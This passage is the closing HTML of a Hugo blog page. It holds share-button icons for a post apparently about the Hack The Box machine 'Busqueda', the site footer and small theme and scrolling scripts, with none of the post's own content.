11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share The Path to Root: Hijacking the Search on HTB 'Busqueda' on whatsapp" href="https://api.whatsapp.com/send?text=The%20Path%20to%20Root%3a%20Hijacking%20the%20Search%20on%20HTB%20%27Busqueda%27%20-%20%2f%2flocalhost%3a1313%2fposts%2fbusqueda%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share The Path to Root: Hijacking the Search on HTB 'Busqueda' on telegram" href="https://telegram.me/share/url?text=The%20Path%20to%20Root%3a%20Hijacking%20the%20Search%20on%20HTB%20%27Busqueda%27&amp;url=%2f%2flocalhost%3a1313%2fposts%2fbusqueda%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share The Path to Root: Hijacking the Search on HTB 'Busqueda' on ycombinator" href="https://news.ycombinator.com/submitlink?t=The%20Path%20to%20Root%3a%20Hijacking%20the%20Search%20on%20HTB%20%27Busqueda%27&u=%2f%2flocalhost%3a1313%2fposts%2fbusqueda%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=//localhost:1313/>Fieryrival's Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script></body></html>